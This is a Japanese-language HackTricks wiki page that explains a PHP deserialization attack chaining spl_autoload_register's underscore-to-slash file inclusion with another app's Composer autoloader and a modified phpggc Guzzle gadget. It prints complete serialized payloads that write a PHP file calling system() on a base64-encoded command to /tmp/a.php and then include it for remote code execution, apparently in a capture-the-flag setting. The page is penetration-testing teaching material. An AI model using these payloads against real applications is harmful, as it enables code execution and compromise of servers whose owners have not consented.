# PHP - Deserialization + Autoload Classes

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

まず、[**オートローディングクラス**](https://www.php.net/manual/en/language.oop5.autoload.php)が何であるかを確認する必要があります。

## PHPデシリアライズ + spl\_autoload\_register + LFI/Gadget

私たちは、**`phpggc`**内にガジェットに脆弱なライブラリが**ない**ウェブアプリで**PHPデシリアライズ**を見つけた状況にいます。しかし、同じコンテナ内には**脆弱なライブラリを持つ別のComposerウェブアプリ**がありました。したがって、目標は**他のウェブアプリのComposerローダーを読み込み**、それを悪用して**デシリアライズに脆弱なウェブアプリのガジェットを使用してそのライブラリを攻撃すること**でした。

手順：

* **デシリアライズ**を見つけ、現在のアプリコードには**ガジェットがない**
* 次のような**`spl_autoload_register`**関数を悪用して、**`.php`拡張子のローカルファイルを読み込む**
* そのために、クラス名が**`$name`**の中に入るデシリアライズを使用します。シリアライズされたオブジェクトのクラス名に**"/"や"."**を使用することはできませんが、**コード**は**アンダースコア**("\_")を**スラッシュ**("/")に**置き換えています**。したがって、`tmp_passwd`のようなクラス名は`/tmp/passwd.php`に変換され、コードはそれを読み込もうとします。\
**ガジェットの例**は次のようになります：**`O:10:"tmp_passwd":0:{}`**
```php
spl_autoload_register(function ($name) {

if (preg_match('/Controller$/', $name)) {
$name = "controllers/${name}";
} elseif (preg_match('/Model$/', $name)) {
$name = "models/${name}";
} elseif (preg_match('/_/', $name)) {
$name = preg_replace('/_/', '/', $name);
}

$filename = "/${name}.php";

if (file_exists($filename)) {
require $filename;
}
elseif (file_exists(__DIR__ . $filename)) {
require __DIR__ . $filename;
}
});
```
{% hint style="success" %}
もし**ファイルアップロード**があり、**`.php`拡張子**のファイルをアップロードできる場合、この機能を**直接悪用**して、すでにRCEを取得することができます。
{% endhint %}

私の場合、そのようなものはありませんでしたが、**同じコンテナ**内に**`phpggc`ガジェットに脆弱なライブラリ**を持つ別のComposerウェブページがありました。

* この別のライブラリを読み込むには、まず**その別のウェブアプリのComposerローダーを読み込む必要があります**（現在のアプリケーションのものでは他のライブラリにアクセスできません）。**アプリケーションのパスを知っていれば**、次のように非常に簡単に実現できます：**`O:28:"www_frontend_vendor_autoload":0:{}`**（私の場合、Composerローダーは`/www/frontend/vendor/autoload.php`にありました）
* さて、他の**アプリのComposerローダーを読み込む**ことができるので、**使用するための`phpgcc`** **ペイロードを生成する**時が来ました。私の場合、**`Guzzle/FW1`**を使用し、これにより**ファイルシステム内の任意のファイルを書き込む**ことができました。
* 注：**生成されたガジェットは機能しませんでした**。機能させるために、**`chain.php`**のペイロードを**修正**し、クラスの**すべての属性**を**privateからpublicに**設定しました。そうしないと、文字列をデシリアライズした後、作成されたオブジェクトの属性には値がありませんでした。
* これで、**他のアプリのComposerローダーを読み込む方法**があり、**機能するphpggcペイロード**もありますが、**ガジェットが使用されるときにローダーが読み込まれるように、同じリクエスト内でこれを行う必要があります**。そのため、次のように両方のオブジェクトを含むシリアライズされた配列を送信しました：
* **最初にローダーが読み込まれ、その後ペイロードが表示される**のがわかります。

{% code overflow="wrap" %}
```php
a:2:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}}
```
{% endcode %}

* さて、**ファイルを作成して書き込む**ことができますが、ユーザーは**ウェブサーバー内の任意のフォルダーに書き込むことができません**。したがって、ペイロードに示されているように、PHPは**`system`**を呼び出し、いくつかの**base64**が**`/tmp/a.php`**に作成されます。次に、**最初のタイプのペイロード**を再利用して、他のウェブアプリのコンポーザーローダーを読み込むために、生成された**`/tmp/a.php`**ファイルを読み込むことができます。それをデシリアライズガジェットに追加するだけです:&#x20;

{% code overflow="wrap" %}
```php
a:3:{s:5:"Extra";O:28:"www_frontend_vendor_autoload":0:{}s:6:"Extra2";O:31:"GuzzleHttp\Cookie\FileCookieJar":4:{s:7:"cookies";a:1:{i:0;O:27:"GuzzleHttp\Cookie\SetCookie":1:{s:4:"data";a:3:{s:7:"Expires";i:1;s:7:"Discard";b:0;s:5:"Value";s:56:"<?php system('echo L3JlYWRmbGFn | base64 -d | bash'); ?>";}}}s:10:"strictMode";N;s:8:"filename";s:10:"/tmp/a.php";s:19:"storeSessionCookies";b:1;}s:6:"Extra3";O:5:"tmp_a":0:{}}
```
{% endcode %}

**ペイロードの概要**

* **同じコンテナ内の別のウェブアプリのcomposerオートロードを読み込む**
* **phpggcガジェットを読み込む** ことで、他のウェブアプリのライブラリを悪用する（最初のウェブアプリはデシリアライズに対して脆弱で、ライブラリにガジェットがなかった）
* ガジェットは、悪意のあるコマンドを含む**PHPペイロード**を/tmp/a.phpに作成する（ウェブアプリのユーザーは、どのウェブアプリのフォルダーにも書き込むことができない）
* ペイロードの最終部分は、**生成されたPHPファイルを読み込む**ことでコマンドを実行する

私はこのデシリアライズを**2回呼び出す必要があった**。私のテストでは、最初の時に/tmp/a.phpファイルが作成されたが読み込まれず、2回目に正しく読み込まれた。

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
